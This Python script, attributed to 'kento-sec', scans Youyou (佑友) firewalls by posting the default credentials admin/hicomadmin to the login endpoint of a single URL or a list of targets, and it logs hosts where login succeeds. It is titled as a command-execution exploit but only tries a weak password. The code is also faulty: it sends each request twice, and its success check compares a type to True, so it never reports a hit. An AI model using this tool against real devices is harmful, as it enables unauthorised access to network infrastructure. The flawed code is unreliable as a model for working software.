import requests
import argparse
import urllib3
import sys
import json

urllib3.disable_warnings()


def title():
    print("""
                               佑友防火墙后台命令执行漏洞
                      use: python3  佑友防火墙后台命令执行漏洞.py
                                 Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        url = self.url + "/index.php?c=user&a=ajax_save"
        payload = {"username": "admin", "password": "hicomadmin", "language": "zh-cn"}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
            'Connection': 'close'
        }
        try:
            requests.packages.urllib3.disable_warnings()
            r = requests.request("post", url, headers=headers, verify=False, timeout=1, data=payload)
            print("准备发送post包了")
            r = requests.request("post", url, headers=headers, verify=False, timeout=1, data=payload)
            print("下一步，查看响应数据")
            print(type(r))
            data = r.text
            print(type(data))
            print("成功查看响应数据，对数据进行json解析")
            dict_data = json.loads(data)
            print(type(dict_data))
            print(dict_data)
            print("成功解析数据，查找success字段")
            data_com = dict_data['success']
            print(type(data_com))
            print("成功找到success字段，下一步抓取字段中到true值")
            print(data_com)
            if type(data_com) == True:
                print("\033[32m[o]#################" + self.url + "存在佑友防火墙弱口令漏洞#################\033[0m")
                with open("佑友防火墙弱口令漏洞结果.txt", mode="a") as rp:
                    rp.write(self.url + " 登陆成功！" + "\n")
            else:
                print(self.url + "不存在佑友防火墙弱口令漏洞")
        except:
            pass

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="佑友防火墙后台命令执行漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 佑友防火墙后台命令执行漏洞.py -u http://127.0.0.1\neg2:>>>python3 佑友防火墙后台命令执行漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
